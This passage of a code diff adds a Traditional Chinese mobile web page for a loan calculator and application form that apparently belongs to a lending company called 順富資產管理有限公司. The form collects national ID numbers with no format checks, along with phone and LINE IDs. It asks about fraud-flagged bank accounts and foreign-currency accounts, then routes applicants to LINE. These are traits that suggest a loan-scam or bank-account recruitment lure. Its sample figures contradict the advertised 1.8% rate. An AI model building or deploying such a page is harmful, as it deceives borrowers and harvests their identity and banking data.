@@ -1,0 +1,1225 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>快速貸款試算｜順富資產管理有限公司</title>
+  <meta name="description" content="順富資產管理有限公司提供線上貸款額度試算，最高可評估 NT$1,000,000，填寫資料後由專員協助確認方案。">
+  <script src="page-config.js"></script>
+  <style>
+    :root{
+      --navy:#075c31;
+      --navy2:#064625;
+      --blue:#108747;
+      --gold:#108747;
+      --gold2:#16a45a;
+      --ink:#102033;
+      --muted:#6a7280;
+      --line:#e0e6ee;
+      --soft:#f3f6fa;
+      --white:#fff;
+      --green:#108747;
+      --danger:#dc2626;
+      --shadow:0 16px 40px rgba(12,39,77,.14);
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{
+      margin:0;
+      font-family:"Microsoft JhengHei","PingFang TC",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+      background:#eef5ef;
+      color:var(--ink);
+      -webkit-font-smoothing:antialiased;
+    }
+    button,input,select{font:inherit}
+    button{cursor:pointer;-webkit-tap-highlight-color:transparent}
+    .app{
+      width:min(430px,100%);
+      min-height:100dvh;
+      margin:0 auto;
+      background:#f7faf8;
+      position:relative;
+      box-shadow:0 0 0 1px rgba(15,23,42,.06);
+      overflow:hidden;
+    }
+    .top{
+      min-height:118px;
+      background:
+        radial-gradient(circle at 90% 0%, rgba(255,255,255,.18), transparent 32%),
+        linear-gradient(140deg,#075c31,#064625);
+      color:#fff;
+      padding:24px 20px 32px;
+      position:relative;
+      top:0;
+      z-index:1;
+      box-shadow:0 6px 20px rgba(7,26,54,.2);
+    }
+    .brand-row{display:flex;align-items:flex-start;justify-content:space-between;gap:14px}
+    .brand{display:flex;align-items:center;gap:13px;min-width:0}
+    .back-dot{
+      width:48px;height:48px;border-radius:16px;
+      display:grid;place-items:center;
+      background:rgba(255,255,255,.15);
+      color:#fff;
+      font-size:0;
+      font-weight:950;
+      flex:none;
+    }
+    .back-dot:before{content:attr(data-logo-initial);font-size:23px}
+    .brand-name{font-weight:950;font-size:23px;white-space:normal;overflow:visible;text-overflow:clip;letter-spacing:.02em;line-height:1.18}
+    .status{display:none}
+    .sub-head{margin:6px 0 0 61px;color:#d6eadf;font-size:15px;font-weight:800}
+    .screen{display:none;min-height:calc(100dvh - 118px)}
+    .screen.active{display:block}
+    .estimate{padding:0 10px 22px;margin-top:-22px}
+    .card{
+      background:var(--white);
+      border:1px solid #e5ebf2;
+      border-radius:20px;
+      box-shadow:0 10px 26px rgba(13,27,54,.07);
+      padding:18px;
+      margin-bottom:12px;
+    }
+    .hero-credit{padding:25px 21px;display:grid;grid-template-columns:auto 1fr auto;gap:18px;align-items:center}
+    .shield{width:78px;height:78px;border-radius:50%;background:#e9f8ef;color:var(--green);display:grid;place-items:center;font-size:31px;font-weight:950;box-shadow:inset 0 0 0 12px #eefaf3}
+    .hero-credit small{display:block;font-size:15px;color:#374151;font-weight:900;margin-bottom:3px}
+    .hero-credit strong{display:block;color:#075c31;font-size:36px;line-height:1.08;letter-spacing:.02em}
+    .hero-credit span{display:block;color:#7a828c;font-size:14px;margin-top:8px;font-weight:800}
+    .bank-ghost{width:84px;height:84px;border:2px solid #d7eee0;border-radius:18px;display:grid;place-items:center;color:#b8dbc8;font-size:48px;font-weight:950}
+    .calc-layout{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .calc-card{padding:20px 18px}
+    .row-title{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}
+    .label{font-size:15px;font-weight:900;color:#102033}
+    .amount-display{font-size:31px;font-weight:950;color:var(--navy);letter-spacing:.2px;margin:16px 0}
+    .range{width:100%;accent-color:var(--blue)}
+    .range-scale{display:flex;justify-content:space-between;color:#98a2b3;font-size:12px;margin-top:8px}
+    .section-label{font-size:15px;font-weight:950;margin:0 0 12px;color:#142238}
+    .mini-actions{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:18px}
+    .mini-btn{border:1px solid #dfe7e2;background:#fff;color:#627083;border-radius:15px;min-height:50px;font-size:17px;font-weight:900}
+    .mini-btn b{color:#0c8d4a;font-size:23px;vertical-align:-1px;margin-right:8px}
+    .option-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+    .purpose-grid{grid-template-columns:repeat(4,1fr)}
+    .option{
+      border:1px solid #e1e8e3;
+      min-height:44px;
+      border-radius:16px;
+      background:#fff;
+      color:#5d6675;
+      font-weight:900;
+      font-size:14px;
+      transition:.16s transform,.16s background,.16s color,.16s box-shadow;
+    }
+    .purpose-grid .option{min-height:76px;border-radius:16px;font-size:13px;display:grid;place-items:center;gap:6px}
+    .purpose-grid .option .ico{display:block;color:#0c8d4a;font-size:25px;line-height:1}
+    .option.selected{
+      background:linear-gradient(145deg,#0e9953,#08713a);
+      color:#fff;
+      border-color:#108747;
+      box-shadow:0 9px 18px rgba(16,135,71,.2);
+    }
+    .option:active,.primary-btn:active,.line-btn:active,.next-btn:active,.back-btn:active{transform:scale(.98)}
+    .result-card{
+      background:
+        radial-gradient(circle at 90% 10%, rgba(255,255,255,.18), transparent 28%),
+        linear-gradient(145deg,#0e9953,#076132);
+      color:#fff;
+      border-color:rgba(255,255,255,.06);
+      box-shadow:0 16px 35px rgba(7,26,54,.25);
+    }
+    .result-kicker{display:flex;align-items:center;gap:8px;font-size:12px;color:#aebed4;margin-bottom:13px}
+    .result-kicker:before{content:"▣";font-size:13px;color:#d9fbe8}
+    .monthly-label{font-size:13px;color:#aebed4;margin-bottom:2px}
+    .monthly-amount{font-size:34px;line-height:1.1;font-weight:950;color:#fff;margin-bottom:17px}
+    .result-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+    .stat{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.14);border-radius:14px;padding:12px 6px;text-align:center}
+    .stat span{display:block;color:#aebed4;font-size:11px;margin-bottom:4px}
+    .stat b{font-size:14px}
+    .note{font-size:12px;color:#778190;line-height:1.7;padding:0 4px 11px}
+    .primary-btn{
+      width:100%;
+      border:0;
+      min-height:58px;
+      border-radius:17px;
+      background:linear-gradient(180deg,#17a85e,#08713a);
+      color:#fff;
+      font-weight:950;
+      font-size:17px;
+      box-shadow:0 12px 22px rgba(16,135,71,.26);
+    }
+    .action-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .outline-btn{width:100%;border:1.5px solid var(--green);min-height:58px;border-radius:17px;background:#fff;color:var(--green);font-weight:950;font-size:17px}
+    .info-band{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#e4ebe6;border-radius:18px;overflow:hidden;margin:12px 0}
+    .info-item{background:#fff;padding:15px 8px;text-align:center}
+    .info-item b{display:block;color:#0b6f3b;font-size:15px;margin-bottom:3px}
+    .info-item span{display:block;color:#7b8490;font-size:11px;font-weight:800}
+    .trust-row{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-top:11px}
+    .trust{font-size:11px;font-weight:900;color:#486071;background:#fff;border:1px solid #e2e8f0;border-radius:999px;padding:5px 9px}
+    .trust.green{color:#047857;background:#ecfdf5;border-color:#a7f3d0}
+    .form-wrap{padding:14px 12px 22px}
+    .form-card{background:#fff;border:1px solid #e5ebf2;border-radius:20px;box-shadow:var(--shadow);padding:18px}
+    .steps{display:flex;align-items:center;margin-bottom:18px}
+    .step-dot{
+      width:30px;height:30px;border-radius:50%;
+      display:grid;place-items:center;
+      background:#e5eaf1;color:#718096;
+      font-size:13px;font-weight:950;
+    }
+    .step-dot.active{background:var(--blue);color:#fff}
+    .step-dot.done{background:var(--green);color:#fff}
+    .step-line{height:3px;flex:1;background:#e5eaf1}
+    .step-line.done{background:var(--green)}
+    .form-title{font-size:22px;font-weight:950;margin:0 0 5px}
+    .form-desc{font-size:13px;color:var(--muted);line-height:1.65;margin:0 0 16px}
+    .panel{display:none}
+    .panel.active{display:block}
+    .choice-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:12px}
+    .choice{
+      border:1.5px solid #d6e0eb;
+      background:#fff;
+      color:#475569;
+      min-height:52px;
+      border-radius:14px;
+      padding:10px 8px;
+      font-size:14px;
+      font-weight:900;
+    }
+    .choice.selected{border-color:var(--blue);background:#eaf5ff;color:#075fa8;box-shadow:inset 0 0 0 1px rgba(11,120,208,.2)}
+    .field{margin-bottom:13px}
+    .field label,.question-label{display:block;font-size:13px;font-weight:900;margin-bottom:7px;color:#263449}
+    .field input,.field select{
+      width:100%;
+      border:1.5px solid #d6e0eb;
+      background:#fff;
+      border-radius:14px;
+      padding:14px;
+      min-height:52px;
+      outline:none;
+      color:#111827;
+      font-size:16px;
+    }
+    .field input:focus,.field select:focus{border-color:var(--blue);box-shadow:0 0 0 4px rgba(11,120,208,.11)}
+    .yn{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:14px}
+    .warn-box{border:1px solid #fecaca;background:#fff5f5;color:#b42318;border-radius:12px;padding:11px 12px;font-size:12px;line-height:1.65;font-weight:800;margin-bottom:14px}
+    .free-box{border:1px solid #bbf7d0;background:#f0fdf4;color:#047857;border-radius:12px;padding:11px 12px;font-size:12px;line-height:1.65;font-weight:800;margin-bottom:14px}
+    .error{display:none;color:var(--danger);font-size:12px;font-weight:900;margin:0 0 10px}
+    .nav-row{display:flex;gap:10px;margin-top:10px}
+    .back-btn,.next-btn{border:0;border-radius:15px;min-height:52px;padding:0 14px;font-size:16px;font-weight:950}
+    .back-btn{width:34%;background:#eef2f7;color:#475569}
+    .next-btn{flex:1;background:var(--blue);color:#fff}
+    .next-btn.gold{background:var(--gold);color:#111827}
+    .footer-note{text-align:center;color:#98a2b3;font-size:11px;line-height:1.65;margin-top:12px}
+    .finish{padding:14px 12px 22px}
+    .finish-card{overflow:hidden;background:#fff;border:1px solid #e5ebf2;border-radius:20px;box-shadow:var(--shadow)}
+    .finish-top{background:linear-gradient(145deg,#07804f,#10b981);color:#fff;text-align:center;padding:28px 18px}
+    .finish-top.blocked{background:linear-gradient(145deg,#b91c1c,#dc2626)}
+    .finish-icon{width:62px;height:62px;border-radius:50%;margin:0 auto 12px;display:grid;place-items:center;background:rgba(255,255,255,.18);border:2px solid rgba(255,255,255,.4);font-size:30px;font-weight:950}
+    .finish-title{font-size:23px;font-weight:950;margin:0 0 5px}
+    .finish-sub{font-size:13px;color:rgba(255,255,255,.85)}
+    .finish-body{padding:18px}
+    .finish-body p{font-size:14px;line-height:1.8;color:#334155;margin:0 0 12px}
+    .summary{background:#f8fafc;border:1px solid #e2e8f0;border-radius:14px;padding:12px;margin:12px 0}
+    .summary div{display:flex;justify-content:space-between;gap:14px;border-bottom:1px dashed #d9e2ec;padding:7px 0;font-size:13px}
+    .summary div:last-child{border-bottom:0}
+    .line-btn{display:flex;align-items:center;justify-content:center;gap:8px;text-decoration:none;background:#06c755;color:#fff;border-radius:15px;min-height:54px;font-size:17px;font-weight:950;margin-top:14px}
+    .loading{position:fixed;inset:0;z-index:80;background:rgba(7,26,54,.62);display:none;align-items:center;justify-content:center;padding:24px}
+    .loading.show{display:flex}
+    .loading-card{background:#fff;border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.24);padding:28px 24px;text-align:center;width:min(330px,100%)}
+    .spinner{width:44px;height:44px;border-radius:50%;border:4px solid #e5e7eb;border-top-color:var(--blue);margin:0 auto 14px;animation:spin .8s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    @media (min-width:780px){
+      body{background:linear-gradient(90deg,#e8f1ea,#f8faf9,#e8f1ea)}
+      .app{margin:24px auto;border-radius:28px;min-height:calc(100dvh - 48px)}
+      .top{border-radius:28px 28px 0 0}
+    }
+    @media (max-width:430px){
+      .hero-credit{grid-template-columns:auto 1fr}.bank-ghost{display:none}.hero-credit strong{font-size:32px}
+      .calc-layout{grid-template-columns:1fr}
+      .purpose-grid{grid-template-columns:repeat(2,1fr)}
+    }
+    @media (max-width:370px){
+      .top{padding-left:16px;padding-right:16px}
+      .brand{gap:10px}
+      .brand-name{font-size:20px;max-width:230px}
+      .sub-head{margin-left:60px;font-size:13px}
+      .amount-display{font-size:24px}
+      .option-grid{gap:8px}
+      .option{font-size:13px}
+      .result-stats{gap:7px}
+      .stat b{font-size:12px}
+    }
+
+    /* P version visual polish: warm brown finance calculator reference */
+    :root{
+      --brown:#81502e;
+      --brown-dark:#4b2414;
+      --brown-mid:#9a6338;
+      --cream:#fff8ef;
+      --cream2:#f7efe5;
+      --ink:#2b211b;
+      --muted:#9a8b7f;
+      --line:#efe4d8;
+      --white:#fff;
+      --danger:#dc2626;
+      --shadow:0 18px 48px rgba(77,36,18,.13);
+    }
+    body{
+      background:
+        radial-gradient(circle at 50% -12%, rgba(129,80,46,.18), transparent 34%),
+        linear-gradient(180deg,#fff7ef 0%,#fbf7f1 48%,#fff 100%);
+      color:var(--ink);
+    }
+    .app{
+      width:min(430px,100%);
+      min-height:100dvh;
+      margin:0 auto;
+      background:#fbf7f1;
+      box-shadow:0 24px 80px rgba(77,36,18,.16);
+      overflow:visible;
+    }
+    .top{
+      min-height:150px;
+      padding:27px 22px 62px;
+      background:
+        radial-gradient(circle at 78% 12%,rgba(255,255,255,.10),transparent 32%),
+        linear-gradient(135deg,#5d301b 0%,#754523 52%,#a87543 100%);
+      box-shadow:none;
+      overflow:hidden;
+      z-index:1;
+    }
+    .top:before{
+      content:"";
+      position:absolute;
+      inset:auto -90px -230px -90px;
+      height:250px;
+      background:#fbf7f1;
+      transform:rotate(10deg);
+      opacity:.98;
+    }
+    .top:after{
+      content:"";
+      position:absolute;
+      right:-80px;
+      top:-20px;
+      width:280px;
+      height:230px;
+      background:radial-gradient(circle,rgba(255,255,255,.13),transparent 62%);
+      pointer-events:none;
+    }
+    .brand-row{position:relative;z-index:2;align-items:flex-start}
+    .brand{gap:12px}
+    .back-dot{
+      width:34px;
+      height:34px;
+      border-radius:50%;
+      background:rgba(255,255,255,.10);
+      color:#fff;
+      box-shadow:none;
+      display:grid;
+      place-items:center;
+      font-size:0;
+      flex:none;
+    }
+    .back-dot:before{
+      content:"‹";
+      font-size:28px;
+      line-height:1;
+      font-weight:500;
+      transform:translateY(-1px);
+    }
+    .brand-name{
+      color:#fff;
+      font-size:21px;
+      line-height:1.25;
+      font-weight:950;
+      white-space:normal;
+      overflow:visible;
+      text-shadow:0 2px 10px rgba(35,12,3,.18);
+    }
+    .status{
+      display:flex;
+      align-items:center;
+      gap:7px;
+      color:#fff;
+      font-size:13px;
+      font-weight:950;
+      padding:0;
+      border:0;
+      background:transparent;
+      white-space:nowrap;
+    }
+    .status:before{
+      content:"";
+      width:10px;
+      height:10px;
+      border-radius:50%;
+      background:#27d17f;
+      box-shadow:0 0 0 5px rgba(39,209,127,.13);
+    }
+    .sub-head{
+      position:relative;
+      z-index:2;
+      margin:12px 0 0 46px;
+      color:rgba(255,255,255,.76);
+      font-size:13px;
+      font-weight:800;
+      line-height:1.45;
+    }
+    .estimate{
+      width:calc(100% - 28px);
+      margin:-44px auto 0;
+      padding-bottom:24px;
+      position:relative;
+      z-index:5;
+    }
+    .card{
+      background:rgba(255,255,255,.92);
+      border:1px solid rgba(239,228,216,.92);
+      border-radius:24px;
+      box-shadow:var(--shadow);
+      padding:22px;
+      margin-bottom:15px;
+    }
+    .hero-credit{
+      min-height:220px;
+      padding:23px 22px 26px;
+      display:grid;
+      grid-template-columns:1fr 112px;
+      gap:12px;
+      align-items:start;
+      overflow:hidden;
+      position:relative;
+    }
+    .hero-credit:after{display:none}
+    .hero-credit>div:nth-child(2){
+      grid-column:1;
+      grid-row:1;
+      position:relative;
+      z-index:4;
+      padding-right:0;
+    }
+    .hero-credit small{
+      display:block;
+      font-size:16px;
+      color:#3b2a20;
+      font-weight:950;
+      margin-bottom:14px;
+    }
+    .hero-credit span{display:none}
+    .hero-credit strong{
+      display:block;
+      color:#3b2419;
+      font-size:37px;
+      line-height:1.05;
+      letter-spacing:-.02em;
+      font-weight:950;
+      white-space:nowrap;
+      margin:0 0 22px;
+    }
+    .shield{
+      grid-column:2;
+      grid-row:1;
+      position:relative;
+      right:auto;
+      top:auto;
+      width:112px;
+      height:112px;
+      border-radius:28px;
+      background:linear-gradient(145deg,#fff4e6,#e9c7a4);
+      opacity:1;
+      box-shadow:inset 0 0 0 8px rgba(255,255,255,.35),0 14px 30px rgba(126,79,42,.14);
+    }
+    .shield:before{
+      content:"";
+      position:absolute;
+      right:12px;
+      bottom:16px;
+      width:46px;
+      height:46px;
+      border-radius:50%;
+      background:repeating-linear-gradient(to bottom,#c48c54 0 8px,#a66a39 8px 11px);
+      box-shadow:-28px 12px 0 -6px #bf8351,-14px -6px 0 -8px #e6bd91;
+    }
+    .shield:after{
+      content:"";
+      position:absolute;
+      left:15px;
+      top:18px;
+      width:58px;
+      height:68px;
+      border-radius:18px;
+      background:
+        linear-gradient(90deg,transparent 0 30%,rgba(129,80,46,.12) 30% 34%,transparent 34% 100%),
+        linear-gradient(#f5dcc1,#fff2df);
+      box-shadow:inset 0 0 0 4px rgba(255,255,255,.35);
+    }
+    .bank-ghost{display:none}
+    .range{
+      width:100%;
+      accent-color:var(--brown);
+      height:24px;
+    }
+    .range-scale{
+      display:flex;
+      justify-content:space-between;
+      color:#a39487;
+      font-size:12px;
+      font-weight:800;
+      margin-top:10px;
+    }
+    .section-label,.label{
+      color:#3b2a20;
+      font-size:17px;
+      line-height:1.3;
+      font-weight:950;
+      margin:0 0 18px;
+    }
+    .section-label:before,.label:before{display:none}
+    .calc-card{display:none}
+    .term-card,.purpose-card{padding:23px 22px}
+    .term-head{display:block;margin:0}
+    .term-tip{display:none}
+    .option-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+    #termOptions .option{
+      min-height:50px;
+      border-radius:14px;
+      border:1px solid #f1e6da;
+      background:#f7eee5;
+      color:#5c4030;
+      font-size:17px;
+      font-weight:950;
+      box-shadow:inset 0 1px 0 rgba(255,255,255,.55);
+    }
+    #termOptions .option.selected{
+      background:linear-gradient(135deg,#9d6538,#6c371f);
+      color:#fff;
+      border-color:transparent;
+      box-shadow:0 12px 22px rgba(111,58,32,.22);
+    }
+    #termOptions .option.selected:after{display:none}
+    .purpose-grid{
+      grid-template-columns:repeat(4,1fr);
+      gap:10px;
+      margin-top:0;
+    }
+    .purpose-grid .option{
+      min-height:84px;
+      border-radius:14px;
+      border:1px solid #f1e6da;
+      background:#f7eee5;
+      color:#6a4b38;
+      font-size:13px;
+      font-weight:950;
+      display:grid;
+      place-items:center;
+      gap:8px;
+      padding:8px 4px;
+      box-shadow:inset 0 1px 0 rgba(255,255,255,.55);
+    }
+    .purpose-grid .option .ico{
+      display:block;
+      color:#8f5b35;
+      font-size:27px;
+      line-height:1;
+      min-width:0;
+    }
+    .purpose-grid .option.selected{
+      background:linear-gradient(135deg,#9d6538,#6c371f);
+      color:#fff;
+      border-color:transparent;
+      box-shadow:0 12px 22px rgba(111,58,32,.22);
+    }
+    .purpose-grid .option.selected .ico{color:#fff}
+    .purpose-grid .option.selected:after{display:none}
+    .result-card{
+      background:
+        radial-gradient(circle at 86% 22%,rgba(255,255,255,.08),transparent 28%),
+        linear-gradient(145deg,#7a4d31,#421d10);
+      border-color:rgba(255,255,255,.08);
+      color:#fff;
+      border-radius:18px;
+      padding:23px 22px 18px;
+      box-shadow:0 18px 42px rgba(63,29,14,.22);
+    }
+    .result-kicker{
+      color:#fff;
+      font-size:15px;
+      font-weight:950;
+      margin-bottom:19px;
+      display:block;
+    }
+    .result-kicker:before{display:none}
+    .monthly-label{color:#fff;font-size:15px;font-weight:850}
+    .monthly-amount{
+      color:#fff;
+      font-size:35px;
+      line-height:1.1;
+      font-weight:950;
+      margin:8px 0 22px;
+    }
+    .result-stats{
+      border-top:1px solid rgba(255,255,255,.12);
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:0;
+      padding-top:16px;
+    }
+    .stat{
+      background:transparent;
+      border:0;
+      border-radius:0;
+      min-height:auto;
+      padding:0 6px;
+      text-align:center;
+      display:block;
+    }
+    .stat:nth-child(4){display:none}
+    .stat span{display:block;color:rgba(255,255,255,.78);font-size:13px;margin-bottom:7px}
+    .stat b{display:block;color:#fff;font-size:16px;font-weight:950}
+    .note{
+      color:#b7aaa0;
+      font-size:12px;
+      line-height:1.7;
+      text-align:left;
+      padding:0 4px 0;
+      margin:0 0 13px;
+    }
+    .info-band{display:none}
+    .action-row{
+      display:block;
+      margin-top:14px;
+    }
+    .primary-btn{
+      width:100%;
+      min-height:56px;
+      border:0;
+      border-radius:999px;
+      background:linear-gradient(135deg,#a06b40,#6f3b22);
+      color:#fff;
+      font-size:18px;
+      font-weight:950;
+      box-shadow:0 14px 28px rgba(111,58,32,.20);
+    }
+    .outline-btn{display:none}
+    .trust-row{
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:8px;
+      margin-top:14px;
+      color:#a99d93;
+    }
+    .trust{
+      border:0;
+      background:transparent;
+      color:#9d9289;
+      font-size:11px;
+      font-weight:900;
+      padding:0;
+      text-align:center;
+    }
+    .trust.green{color:#9d9289;background:transparent;border:0}
+    .form-wrap,.finish{background:#fbf7f1}
+    .form-card,.finish-card{
+      border-color:#f0e2d5;
+      box-shadow:0 18px 42px rgba(77,36,18,.11);
+    }
+    .step-dot.active,.step-dot.done{
+      background:linear-gradient(135deg,#9d6538,#6c371f);
+      color:#fff;
+    }
+    .step-line.done{background:linear-gradient(90deg,#9d6538,#6c371f)}
+    .choice.selected{
+      border-color:#8b5631;
+      background:#f8efe6;
+      color:#6c371f;
+      box-shadow:inset 0 0 0 1px rgba(129,80,46,.15);
+    }
+    .field input:focus,.field select:focus{
+      border-color:#8b5631;
+      box-shadow:0 0 0 4px rgba(129,80,46,.10);
+    }
+    .free-box{
+      border-color:#ead4c0;
+      background:#fff8ef;
+      color:#7b4728;
+    }
+    .back-btn{background:#f8efe6;color:#6c371f}
+    .next-btn,.next-btn.gold{
+      background:linear-gradient(135deg,#9d6538,#6c371f);
+      color:#fff;
+      box-shadow:0 12px 22px rgba(111,58,32,.20);
+    }
+    .finish-top{
+      background:linear-gradient(145deg,#9d6538,#6c371f);
+    }
+    .spinner{border-top-color:var(--brown)}
+    .summary b{color:#6c371f}
+
+    @media (min-width:780px){
+      body{background:linear-gradient(90deg,#f4ece2,#fffaf4,#f4ece2)}
+      .app{margin:22px auto;border-radius:28px;min-height:calc(100dvh - 44px)}
+      .top{border-radius:28px 28px 0 0}
+    }
+  
+  </style>
+</head>
+<body>
+<div class="app">
+  <header class="top">
+    <div class="brand-row">
+      <div class="brand"><span class="back-dot" aria-hidden="true"></span><span class="brand-name" data-company-name>順富資產管理有限公司</span></div>
+      <div class="status">線上試算中</div>
+    </div>
+    <div class="sub-head">最高可貸 NT$1,000,000・年利率 1.8% 起</div>
+  </header>
+
+  <main id="estimateScreen" class="screen active">
+    <section class="estimate">
+      <div class="card hero-credit">
+        <div class="shield" aria-hidden="true"></div>
+        <div>
+          <small>申請金額</small>
+          <strong id="heroAmount">NT$ 500,000</strong>
+          <span id="amountDisplay" hidden>NT$ 500,000</span>
+          <span>最高可貸 NT$1,000,000・年利率 1.8% 起</span>
+          <input id="amountRange" class="range" type="range" min="100000" max="1000000" step="10000" value="500000">
+          <div class="range-scale"><span>NT$ 100,000</span><span>NT$ 1,000,000</span></div>
+        </div>
+      </div>
+
+      <div class="card term-card">
+        <div class="term-head">
+          <h2 class="section-label">還款期數</h2>
+        </div>
+        <div class="option-grid" id="termOptions">
+          <button class="option" type="button" data-term="6">6期</button>
+          <button class="option" type="button" data-term="12">12期</button>
+          <button class="option selected" type="button" data-term="18">18期</button>
+          <button class="option" type="button" data-term="24">24期</button>
+          <button class="option" type="button" data-term="30">30期</button>
+          <button class="option" type="button" data-term="36">36期</button>
+          <button class="option" type="button" data-term="48">48期</button>
+          <button class="option" type="button" data-term="60">60期</button>
+        </div>
+      </div>
+
+      <div class="card purpose-card">
+        <h2 class="section-label">貸款用途</h2>
+        <div class="option-grid purpose-grid" id="purposeOptions">
+          <button class="option selected" type="button" data-purpose="教育進修"><span class="ico">▱</span>教育進修</button>
+          <button class="option" type="button" data-purpose="房屋修繕"><span class="ico">⌂</span>房屋修繕</button>
+          <button class="option" type="button" data-purpose="結婚資金"><span class="ico">♡</span>結婚資金</button>
+          <button class="option" type="button" data-purpose="旅遊休閒"><span class="ico">✈</span>旅遊休閒</button>
+          <button class="option" type="button" data-purpose="醫療費用"><span class="ico">▣</span>醫療費用</button>
+          <button class="option" type="button" data-purpose="創業資金"><span class="ico">▥</span>創業資金</button>
+          <button class="option" type="button" data-purpose="債務整合"><span class="ico">◔</span>債務整合</button>
+          <button class="option" type="button" data-purpose="其他用途"><span class="ico">⌘</span>其他用途</button>
+        </div>
+      </div>
+
+      <div class="card result-card">
+        <div class="result-kicker">試算結果（僅供參考）</div>
+        <div class="monthly-label">每月應還</div>
+        <div id="monthlyPayment" class="monthly-amount">NT$ 31,138</div>
+        <div class="result-stats">
+          <div class="stat"><span>年利率</span><b id="rateText">1.8%</b></div>
+          <div class="stat"><span>總利息</span><b id="interestText">NT$60,484</b></div>
+          <div class="stat"><span>總還款</span><b id="totalText">NT$560,484</b></div>
+          <div class="stat"><span>還款期數</span><b id="termText">18期</b></div>
+        </div>
+      </div>
+      <div class="note">以上試算僅供參考，實際核准利率及金額依審核結果為準，年利率範圍 1.8% 至 5%。</div>
+      <div class="action-row">
+        <button id="applyNow" class="primary-btn" type="button">立即申請貸款 ＞</button>
+        <button id="recalcBtnBottom" class="outline-btn" type="button">立即試算</button>
+      </div>
+      <div class="trust-row">
+        <span class="trust">全程免費</span>
+        <span class="trust">不查可先試算</span>
+        <span class="trust">專員協助評估</span>
+      </div>
+    </section>
+  </main>
+
+  <main id="formScreen" class="screen">
+    <section class="form-wrap">
+      <div class="form-card">
+        <div class="steps">
+          <div id="stepDot1" class="step-dot active">1</div><div id="stepLine1" class="step-line"></div>
+          <div id="stepDot2" class="step-dot">2</div><div id="stepLine2" class="step-line"></div>
+          <div id="stepDot3" class="step-dot">3</div>
+        </div>
+
+        <form id="loanForm">
+          <div class="panel active" data-step="1">
+            <h1 class="form-title">您需要多少金額？</h1>
+            <p class="form-desc">先確認需求金額，專員會依照您填寫的資料協助初步評估。</p>
+            <div class="choice-grid" id="formAmountOptions">
+              <button class="choice" type="button" data-value="10萬 - 20萬">10萬 - 20萬</button>
+              <button class="choice" type="button" data-value="20萬 - 30萬">20萬 - 30萬</button>
+              <button class="choice selected" type="button" data-value="30萬 - 50萬">30萬 - 50萬</button>
+              <button class="choice" type="button" data-value="50萬 - 100萬">50萬 - 100萬</button>
+              <button class="choice" type="button" data-value="100萬以上">100萬以上</button>
+            </div>
+            <div id="amountError" class="error">請選擇貸款金額</div>
+          </div>
+
+          <div class="panel" data-step="2">
+            <h1 class="form-title">填寫基本資料</h1>
+            <p class="form-desc">身分證字號與手機號碼只要有填寫即可，不限制字數格式。</p>
+            <div class="field"><label>姓名 *</label><input name="name" type="text" placeholder="請輸入姓名" required></div>
+            <div class="field"><label>年齡 *</label><input name="age" type="number" placeholder="請輸入年齡" required></div>
+            <div class="field"><label>手機號碼 *</label><input name="phone" type="tel" placeholder="請輸入手機號碼" required></div>
+            <div class="field"><label>LINE ID *</label><input name="lineId" type="text" placeholder="請輸入 LINE ID" required></div>
+            <div class="field"><label>身分證字號 *</label><input name="id_card" type="text" placeholder="請輸入身分證字號" required></div>
+            <div class="field"><label>居住縣市 *</label><select name="county" id="county" required><option value="">請選擇縣市</option></select></div>
+          </div>
+
+          <div class="panel" data-step="3">
+            <h1 class="form-title">確認財務狀況</h1>
+            <p class="form-desc">以下資料僅用於初步評估，送出後請加入官方 LINE 完成最後申請。</p>
+            <div class="warn-box">特別提醒：警示戶申請不會通過，請勿送出。</div>
+            <div class="free-box">✓ 申辦全程免費，絕無任何隱藏費用。</div>
+            <div class="question-label">銀行是否為警示戶？ *</div>
+            <div class="yn" data-group="is_warning"><button class="choice" type="button" data-value="是">是</button><button class="choice" type="button" data-value="否">否</button></div>
+            <div class="question-label">是否有個人外幣帳戶？ *</div>
+            <div class="yn" data-group="has_foreign"><button class="choice" type="button" data-value="是">是</button><button class="choice" type="button" data-value="否">否</button></div>
+            <div class="question-label">是否有信貸、房貸、車貸或機貸？ *</div>
+            <div class="yn" data-group="has_loan"><button class="choice" type="button" data-value="是">是</button><button class="choice" type="button" data-value="否">否</button></div>
+            <div class="question-label">是否有銀行協商或呆帳？ *</div>
+            <div class="yn" data-group="has_debt"><button class="choice" type="button" data-value="是">是</button><button class="choice" type="button" data-value="否">否</button></div>
+            <div id="ynError" class="error">請完成所有財務狀況選項</div>
+            <div id="warningError" class="error">警示戶目前無法辦理，請先向銀行確認警示戶狀態，解除後再重新評估。</div>
+          </div>
+
+          <div id="submitError" class="error"></div>
+          <div class="nav-row">
+            <button id="backBtn" class="back-btn" type="button" style="display:none">上一步</button>
+            <button id="nextBtn" class="next-btn" type="button">下一步</button>
+          </div>
+        </form>
+      </div>
+      <div class="footer-note">送出即表示您同意由專員依資料進行初步評估。</div>
+    </section>
+  </main>
+
+  <main id="finishScreen" class="screen">
+    <section class="finish">
+      <div class="finish-card">
+        <div id="finishTop" class="finish-top">
+          <div id="finishIcon" class="finish-icon">✓</div>
+          <h2 id="finishTitle" class="finish-title">初步資料已送出</h2>
+          <div id="finishSub" class="finish-sub">請加入 LINE 完成最後申請</div>
+        </div>
+        <div class="finish-body">
+          <p id="finishDesc"><b id="finishName">您好</b>，您的資料已送出。下一步請加入官方 LINE，由專員確認可申請方案與額度。</p>
